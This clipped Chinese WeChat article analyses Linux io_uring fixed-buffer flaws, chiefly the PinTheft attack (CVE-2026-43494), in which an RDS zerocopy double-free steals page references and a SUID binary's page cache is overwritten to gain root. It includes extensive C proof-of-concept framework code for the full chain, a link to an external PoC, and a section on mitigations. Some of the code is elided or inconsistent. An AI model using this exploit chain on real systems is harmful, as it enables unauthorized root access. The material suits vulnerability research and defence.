---
title: 【微信】Linux io_uring 固定缓冲区逃逸
source: https://mp.weixin.qq.com/s/HKKHoS4T7rjGdJKKDL-42A
source_host: mp.weixin.qq.com
clip_date: 2026-09-23T08:11:58+08:00
trace_id: a6e608db-bdf9-454f-82ac-e49d03167036
content_hash: d56bf2f7fb67e142ecf6923b8b45b39c93c5f0387c4796c1e679d1e5850f2184
status: synced
tags:
  - 微信
  - 漏洞分析
  - 内核
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: io_uring 固定缓冲区长期持有的 FOLL_PIN 引用可被 RDS 零拷贝 double-free 逐次窃取，页提前释放后重分配为 SUID 页缓存并被改写，实现本地提权。
ai_summary_style: key-points
images_status:
  total: 2
  succeeded: 2
  failed_urls: []
notion_page_id: 3e475244-d011-81d3-a832-f93ed128b5ea
ioc:
  cves:
    - CVE-2022-4696
    - CVE-2026-43006
    - CVE-2026-43494
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> io_uring 固定缓冲区长期持有的 FOLL_PIN 引用可被 RDS 零拷贝 double-free 逐次窃取，页提前释放后重分配为 SUID 页缓存并被改写，实现本地提权。
> 
> - **根因：** 注册匿名页为固定缓冲区时执行 pin，注入 1024 个 FOLL_PIN 引用（源自 GUP_PIN_COUNTING_BIAS），使引用生命周期与页的实际使用状态解耦，只要外部机制能把计数降到零，bio_vec 就变成悬空指针。
> - **PinTheft 窃取机制（CVE-2026-43494）：** RDS 零拷贝发送中后续页缺页时，错误路径先释放已锁定页，消息清理路径又释放一次（scatterlist 条目仍存活），形成 double-free；每次失败的 zerocopy 发送从目标页窃取一个引用，需执行 1024 次耗尽全部引用。
> - **提权链：** 页归还伙伴系统后，攻击者申请内存使其被重分配为 SUID-root 二进制的页缓存；此时仍可通过 IORING_OP_WRITE_FIXED/SPLICE 写入数据直接改写页缓存中的代码段，植入恶意 ELF，受害者执行 SUID 程序即得 root shell；前置条件是内核启用 RDS/RDS_TCP 且 io_uring 未被禁用。
> - **相关历史缺陷：** CVE-2022-4696 因 IORING_OP_SPLICE 异步路径缺少 IO_WQ_WORK_FILES 标志，nsproxy 引用未递增，get_uts 访问失效指针导致 UAF，5.10.160 修复；CVE-2026-43006 中 validate_fixed_range 在 len 为 0 时允许 buf_addr 落在注册区末尾，io_import_fixed 越界读 bv_offset，造成信息泄露，6.12.36/6.15.5 修复。
> - **防御：** 用 `kernel.io_uring_disabled=1/2` 限制非特权 io_uring；不需要时 `rmmod rds_tcp rds` 并在 `/etc/modprobe.d/` 禁用；SUID 用 nosuid、IMA/EVM 及页缓存哈希校验保护；监控页引用计数异常递减与 RDS EFAULT 高失败率。

**Ghost Wolf Lab** *2026年9月23日 07:30*

## 摘要

io_uring 的固定缓冲区机制通过预注册用户页并长期持有 FOLL_PIN 引用，消除了每次 I/O 操作的页锁定开销。然而，这种“一次注册、永久持有”的设计在 IORING_OP_SPLICE 的异步执行路径中暴露出了引用计数管理的结构性缺陷。CVE-2022-4696 揭示了 io_splice 在异步工作队列中执行时缺少 IO_WQ_WORK_FILES 标志，导致 current->nsproxy 的引用计数未被正确递增，而 get_uts 调用却会使用它，最终造成 use-after-free。更危险的是 PinTheft 攻击（CVE-2026-43494），它通过 RDS 零拷贝发送路径的 double-free 窃取 io_uring 固定缓冲区注册的 FOLL_PIN 引用，将匿名页的引用计数从 1024 降至零，使该页被释放并重新分配为 SUID-root 二进制的页缓存。攻击者随后利用悬空的 io_uring 固定缓冲区指针覆写页缓存，植入恶意 ELF 载荷，执行 SUID 程序即获得 root shell。

## io_uring 固定缓冲区

### 固定缓冲区

io_uring 的核心性能优势之一在于消除了每次 I/O 操作的系统调用开销。但即使绕过了系统调用，每次 I/O 仍然需要将用户缓冲区映射到内核可访问的内存中——这一过程通过 get_user_pages 完成，涉及页表遍历、TLB 填充和引用计数递增。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5457e58222ace67a.png)

固定缓冲区机制将这一开销从“每次操作”降低到“每次注册”。用户通过 io_uring_register 的 IORING_REGISTER_BUFFERS 命令预注册一组缓冲区，内核在注册时对这些页执行 pin_user_pages，获取 FOLL_PIN 引用并长期持有。之后的 I/O 操作直接使用这些已锁定的页，无需重复 pin。

PinTheft 的 PoC 精确描述了这一机制的危险副作用：注册一个匿名页作为固定缓冲区，会给该页赋予 1024 个 FOLL_PIN 引用。这个数字并非随意选择——它反映了 pin_user_pages 内部实现中 GUP_PIN_COUNTING_BIAS 常量的值，用于在页引用计数中区分“普通引用”和“引脚引用”。

### 页引用的生命周期与释放语义

io_uring 固定缓冲区的页引用生命周期包含四个阶段：

注册阶段：io_sqe_buffer_register 调用 pin_user_pages 获取每个页的 FOLL_PIN 引用。内核将这些页的 bio_vec 数组存储在 io_mapped_ubuf 结构中，并与 io_rsrc_node 关联。

使用阶段：I/O 操作通过 IORING_OP_READ_FIXED、IORING_OP_WRITE_FIXED 等固定版本操作，直接引用已注册的 bio_vec，无需再次 pin。

注销阶段：用户调用 IORING_UNREGISTER_BUFFERS 时，io_rsrc_node 被释放，关联的 bio_vec 数组被清理，最终通过 unpin_user_pages 释放 FOLL_PIN 引用。

页释放阶段：当页的引用计数降至零时，页被归还给伙伴系统。

PinTheft 攻击的核心在于：如果在注销之前，FOLL_PIN 引用被外部机制窃取并递减至零，页将被提前释放，而 io_uring 的 bio_vec 中仍然保留着指向该页的悬空指针。

### CVE-2022-4696

CVE-2022-4696 是 io_uring 固定缓冲区引用管理中的第一个被广泛认知的缺陷。NVD 的描述指出，当 IORING_OP_SPLICE 操作缺少 IO_WQ_WORK_FILES 标志时，异步工作队列的执行路径会跳过 current->nsproxy 的引用计数递增。

IO_WQ_WORK_FILES 标志的作用是告知 io-wq 工作队列：该操作需要使用 current->nsproxy。如果设置了此标志，io-wq 在创建工作项时会增加 nsproxy 的引用计数；如果未设置，io-wq 假设操作不会触碰 nsproxy 相关资源，因此不增加引用。

然而，io_splice 在处理特定文件时会调用 get_uts()，该函数内部使用 current->nsproxy。异步执行路径中 current 指向的是 io-wq 的内核线程，而非原始用户进程。当 io-wq 线程的 nsproxy 被切换或销毁时，get_uts 访问的就是一个已经失效的 nsproxy 指针，导致 use-after-free。

## FOLL_PIN 引用窃取

### PinTheft 攻击

PinTheft 攻击（CVE-2026-43494）将 io_uring 固定缓冲区的引用计数缺陷与 RDS 零拷贝发送路径的 double-free 漏洞结合，实现了从引用窃取到页缓存覆写的完整攻击链。

攻击的第一步是注册一个匿名页作为 io_uring 固定缓冲区。如 PinTheft 的 oss-sec 披露所述，这一操作给该页赋予 1024 个 FOLL_PIN 引用。页的 struct page 引用计数因此变为 1024（假设页的初始引用计数为 0，映射到用户空间时增加 1）。

攻击的第二步是利用 RDS 零拷贝发送路径的 double-free 漏洞。rds_message_zcopy_from_user() 函数逐页锁定用户页。如果后续页发生缺页异常，错误处理路径会释放已经锁定的页；但随后 RDS 消息清理路径会再次释放这些页，因为 scatterlist 条目和条目计数在 zcopy 通知器被清除后仍然存活。每次失败的零拷贝发送都会从第一个页窃取一个引用。

攻击者需要执行 1024 次失败的 RDS 零拷贝发送，才能从目标页窃取全部 1024 个 FOLL_PIN 引用。当引用计数降至零时，页被释放并归还给伙伴系统。

### 页缓存覆写

页被释放后，攻击者立即申请分配大量内存，试图让伙伴系统将刚释放的物理页重新分配给 SUID-root 二进制文件的页缓存。由于伙伴系统的分配策略倾向于重用最近释放的页，这一重分配在大多数情况下能够成功。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/78f31acca251d5fa.png)

SUID-root 二进制文件的页缓存被攻击者控制的物理页占据后，io_uring 固定缓冲区中的 bio_vec 仍然指向该物理页。攻击者通过 IORING_OP_WRITE_FIXED 操作向固定缓冲区写入数据——这些数据被内核直接写入页缓存，覆盖了 SUID 二进制的代码段。

攻击者写入的是一个精心构造的 ELF 载荷，其入口点执行 shell 并返回 root 权限。当受害者执行该 SUID 二进制时，内核从被污染的页缓存中加载代码，恶意 ELF 载荷被执行，攻击者获得 root shell。

POC:

https://github.com/v12-security/pocs/tree/09e835b587bf71249775654061ae4c79e92cf430/pintheft

### CVE-2026-43006

CVE-2026-43006 揭示了固定缓冲区导入路径中的另一个缺陷：validate_fixed_range() 在 len 为零时，允许 buf_addr 恰好位于注册区域的末尾。io_import_fixed() 随后计算出 offset == imu->len，导致 bvec 跳过逻辑越过最后一个 bio_vec 条目，从越界的 slab 内存中读取 bv_offset。

KASAN 报告显示，这一越界读发生在 io_import_reg_buf 函数中，读取了距离已分配区域右侧 12 字节的内存。虽然这一漏洞本身仅造成信息泄露，但它与 PinTheft 的页缓存覆写攻击形成了互补——前者可用于获取内核内存布局信息，后者可用于实际的内存写。

## 基于 liburing 的引用窃取框架

### 固定缓冲区注册与引用计数探测

```cpp
// io_uring_pintheft.c — io_uring 固定缓冲区引用窃取 PoC 框架
// 编译: gcc -o pintheft pintheft.c -luring -lpthread
// 需要内核启用 CONFIG_RDS + CONFIG_RDS_TCP + CONFIG_IO_URING
 
#include
#include
#include
#include
#include
#include
#include
#include
 
#define PAGE_SIZE 4096
#define PIN_BIAS 1024  // FOLL_PIN 引用计数偏差
 
// 目标页：将被注册为固定缓冲区
static void *target_page;
 
// 初始化 io_uring 并注册固定缓冲区
int setup_fixed_buffer(struct io_uring *ring) {
    // 分配页对齐的目标页
    target_page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (target_page == MAP_FAILED) {
        perror(”mmap”);
        return -1;
    }
 
    // 写入可识别的标记
    memset(target_page, 0x41, PAGE_SIZE);
 
    // 注册为固定缓冲区
    struct iovec iov = {
        .iov_base = target_page,
        .iov_len = PAGE_SIZE
    };
 
    int ret = io_uring_register_buffers(ring, &iov, 1);
    if (ret < 0) {
        fprintf(stderr, ”io_uring_register_buffers failed: %d\n”, ret);
        return -1;
    }
 
    printf(”[+] 固定缓冲区已注册: %p (FOLL_PIN 引用 +%d)\n”,
           target_page, PIN_BIAS);
    return 0;
}
 
// 探测页的当前引用计数（通过 /proc/self/pagemap 或经验判断）
int probe_page_refcount(void *addr) {
    // 在实际攻击中，攻击者通过反复尝试释放页并观察行为来推断引用计数
    // 此处简化为返回状态
    return 0;
}
```

### 通过 RDS 零拷贝发送窃取引用

```cpp
// rds_refcount_steal.c — 利用 RDS 零拷贝 double-free 窃取页引用
 
#include
#include
#include
#include
 
#define RDS_PORT 4000
 
// 创建 RDS socket
int create_rds_socket(void) {
    int sock = socket(AF_RDS, SOCK_SEQPACKET, 0);
    if (sock < 0) {
        perror(”RDS socket”);
        return -1;
    }
    return sock;
}
 
// 执行一次失败的零拷贝发送，窃取一个页引用
int steal_one_reference(int sock, void *target_page) {
    struct msghdr msg = {0};
    struct iovec iov[2];
 
    // 第一个 iov 指向目标页（将被窃取引用）
    iov[0].iov_base = target_page;
    iov[0].iov_len = PAGE_SIZE;
 
    // 第二个 iov 指向无效地址，触发缺页异常
    // 缺页导致错误路径释放已锁定的第一页
    // 随后清理路径再次释放，完成 double-free
    iov[1].iov_base = (void *)0xdead0000;  // 无效地址
    iov[1].iov_len = PAGE_SIZE;
 
    msg.msg_iov = iov;
    msg.msg_iovlen = 2;
 
    // 使用 RDS 零拷贝发送（MSG_ZEROCOPY）
    ssize_t ret = sendmsg(sock, &msg, MSG_ZEROCOPY | MSG_DONTWAIT);
 
    if (ret < 0 && errno == EFAULT) {
        // 预期的缺页错误，引用已被窃取
        return 1;
    } else if (ret < 0) {
        // 其他错误
        return -1;
    }
    return 0;
}
 
// 执行 PIN_BIAS 次窃取，将引用计数降至零
int drain_all_references(int sock, void *target_page) {
    int stolen = 0;
    for (int i = 0; i < PIN_BIAS; i++) {
        int ret = steal_one_reference(sock, target_page);
        if (ret == 1) {
            stolen++;
        }
        // 短暂延迟，避免被内核限流
        if (i % 100 == 0) {
            usleep(1000);
        }
    }
    printf(”[+] 已窃取 %d 个页引用 (目标: %d)\n”, stolen, PIN_BIAS);
    return stolen;
}
```

### 页缓存覆写与 ELF 载荷注入

```cpp
// pagecache_overwrite.c — 通过悬空固定缓冲区覆写 SUID 页缓存
 
#include
#include
 
// 最小 ELF 载荷：执行 /bin/sh 并保持 root 权限
// 实际攻击中，载荷需要与目标 SUID 二进制的架构和入口点匹配
static const unsigned char elf_payload[] = {
    0x7f, 0x45, 0x4c, 0x46,  // ELF magic
    0x02, 0x01, 0x01, 0x00,  // 64-bit, little-endian
    // ... 完整 ELF 头、程序头和 shell 代码
};
 
// 等待页被重新分配为 SUID 页缓存
int wait_for_pagecache_reclaim(const char *suid_path) {
    printf(”[*] 等待页被重新分配为 %s 的页缓存...\n”, suid_path);
 
    // 打开 SUID 二进制，触发页缓存填充
    int fd = open(suid_path, O_RDONLY);
    if (fd < 0) {
        perror(”open SUID binary”);
        return -1;
    }
 
    // 读取文件内容，将其页缓存加载到内存
    char buf[4096];
    ssize_t n = read(fd, buf, sizeof(buf));
    close(fd);
 
    if (n > 0) {
        printf(”[+] SUID 页缓存已加载 (%zd 字节)\n”, n);
        return 0;
    }
    return -1;
}
 
// 通过 io_uring WRITE_FIXED 向悬空缓冲区写入 ELF 载荷
int overwrite_via_fixed_buffer(struct io_uring *ring, int buf_index,
                               const void *payload, size_t len) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) {
        fprintf(stderr, ”无法获取 SQE\n”);
        return -1;
    }
 
    // 准备一个 pipe 作为数据源
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror(”pipe”);
        return -1;
    }
 
    write(pipefd[1], payload, len);
    close(pipefd[1]);
 
    // 提交 splice 操作：从 pipe 读取数据到固定缓冲区
    // 由于固定缓冲区的页已被重分配为 SUID 页缓存，
    // 数据将被写入页缓存，覆盖 SUID 二进制代码
    io_uring_prep_splice(sqe, pipefd[0], -1, buf_index, -1, len, 0);
    sqe->flags |= IOSQE_FIXED_FILE;
 
    int ret = io_uring_submit(ring);
    if (ret < 0) {
        fprintf(stderr, ”io_uring_submit failed: %d\n”, ret);
        close(pipefd[0]);
        return -1;
    }
 
    // 等待完成
    struct io_uring_cqe *cqe;
    io_uring_wait_cqe(ring, &cqe);
    int result = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    close(pipefd[0]);
 
    if (result < 0) {
        fprintf(stderr, ”splice failed: %d\n”, result);
        return -1;
    }
 
    printf(”[+] 已通过固定缓冲区写入 %d 字节到页缓存\n”, result);
    return 0;
}
```

### 完整攻击链组装

```cpp
// pintheft_full.c — PinTheft 完整攻击链
 
int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, ”用法: %s \n”, argv[0]);
        return 1;
    }
 
    const char *suid_path = argv[1];
    struct io_uring ring;
 
    // 步骤 1: 初始化 io_uring
    if (io_uring_queue_init(32, &ring, 0) < 0) {
        perror(”io_uring_queue_init”);
        return 1;
    }
    printf(”[*] io_uring 已初始化\n”);
 
    // 步骤 2: 注册固定缓冲区（注入 1024 个 FOLL_PIN 引用）
    if (setup_fixed_buffer(&ring) < 0) {
        return 1;
    }
 
    // 步骤 3: 通过 RDS 零拷贝发送窃取全部引用
    int rds_sock = create_rds_socket();
    if (rds_sock < 0) {
        fprintf(stderr, ”[-] RDS 不可用（需要 CONFIG_RDS + CONFIG_RDS_TCP）\n”);
        return 1;
    }
 
    int stolen = drain_all_references(rds_sock, target_page);
    if (stolen < PIN_BIAS) {
        fprintf(stderr, ”[-] 仅窃取 %d/%d 个引用，攻击可能失败\n”,
                stolen, PIN_BIAS);
    }
    close(rds_sock);
 
    // 步骤 4: 触发页释放并重分配为 SUID 页缓存
    if (wait_for_pagecache_reclaim(suid_path) < 0) {
        return 1;
    }
 
    // 步骤 5: 通过悬空固定缓冲区覆写页缓存
    if (overwrite_via_fixed_buffer(&ring, 0,
                                   elf_payload, sizeof(elf_payload)) < 0) {
        return 1;
    }
 
    printf(”[+] 攻击完成。执行 %s 获取 root shell。\n”, suid_path);
 
    io_uring_queue_exit(&ring);
    return 0;
}
```

说明：该 PoC 展示了 PinTheft 攻击的完整框架。步骤 1-2 注册固定缓冲区并注入 FOLL_PIN 引用；步骤 3 通过 RDS 零拷贝的 double-free 窃取引用；步骤 4 等待页被重分配为 SUID 页缓存；步骤 5 通过悬空指针覆写页缓存。实际利用中，ELF 载荷需要与目标 SUID 二进制的架构和入口点精确匹配，且 RDS 模块的可用性是攻击的前置条件。

## 检测与防御

### 引用计数完整性监控

PinTheft 攻击的核心信号是页引用计数的异常递减。Linux 内核可以通过以下方式监控：

-   页引用计数审计：在 unpin_user_pages 和 put_page 的关键路径上增加审计钩子，记录页引用计数的变化。当页的引用计数在短时间内经历大幅递减（超过正常阈值）时触发告警。
    
-   RDS 零拷贝失败率监控：攻击者需要执行 1024 次失败的 RDS 零拷贝发送。监控 RDS 发送的错误率和 EFAULT 频率，异常高的失败率可能表明正在进行的引用窃取攻击。
    

### io_uring 权限与隔离

-   限制 io_uring 访问：通过 `kernel.io_uring_disabled` sysctl 参数限制非特权用户对 io_uring 的访问。设置为 1 时，只有具有 CAP_SYS_ADMIN 能力的进程才能使用 io_uring；设置为 2 时，完全禁用 io_uring。如 PinTheft 的利用条件所述，攻击需要 `io_uring_disabled=0` 。
    
-   禁用 RDS 模块：如果业务不需要 RDS 功能，卸载并禁用 RDS 模块。PinTheft 的缓解方案建议： `rmmod rds_tcp rds` 并在 `/etc/modprobe.d/` 中添加禁用配置。
    
-   SUID 二进制保护：使用 `nosuid` 挂载选项或文件系统级别的完整性监控（如 IMA/EVM）保护 SUID 二进制的页缓存不被篡改。
    

### 内核补丁追踪

-   CVE-2022-4696 修复：升级至 Linux 5.10.160 或更高版本。该版本为 io_splice 添加了缺失的 IO_WQ_WORK_FILES 标志，确保异步执行路径正确管理 nsproxy 引用计数。
    
-   CVE-2026-43006 修复：该漏洞通过在内核 6.12.36 和 6.15.5 中修复，io_import_fixed() 在 len 为零时提前返回，避免遍历 bvec 数组。
    
-   PinTheft 修复：关注 RDS 零拷贝路径的补丁，确保错误处理路径不会重复释放已锁定的页。
    

### 运行时行为检测

-   页缓存完整性校验：对 SUID 二进制文件的页缓存定期计算哈希，与磁盘上的文件内容比对。任何不一致都表明页缓存被篡改。
    
-   异常的 io_uring 操作模式：监控 io_uring 固定缓冲区的注册和注销频率。攻击者需要在短时间内完成注册、窃取、覆写三个步骤，这种操作模式与正常应用的工作负载显著不同。
    

## 结语

io_uring 固定缓冲区的页引用管理揭示了一个深层矛盾：为了消除每次 I/O 操作的页锁定开销，内核选择长期持有 FOLL_PIN 引用——但长期持有意味着引用的生命周期与页的实际使用状态解耦。当外部机制（如 RDS 零拷贝的 double-free）能够从已注册的页中窃取引用时，页的引用计数可以在 io_uring 仍然持有 bio_vec 指针的情况下降至零，导致悬空指针和页缓存覆写。

PinTheft 攻击的精妙之处在于它不依赖 io_uring 自身的代码缺陷，而是将 io_uring 1024 个 FOLL_PIN 引用作为可被其他漏洞利用的资源池。这种跨子系统的漏洞组合使得防御更加困难：io_uring 的开发者无法预见 RDS 路径中的 double-free，而 RDS 的开发者也无法预见 io_uring 会以这种方式持有页引用。

对于防御者而言，禁用 io_uring 或 RDS 是有效的缓解措施，但它们只是权宜之计。更根本的解决方案需要在页引用管理的层面进行强化：为 FOLL_PIN 引用引入不可窃取的隔离机制，或在页引用计数降至零时检测是否存在悬空的固定缓冲区指针。

漏洞利用 · 目录
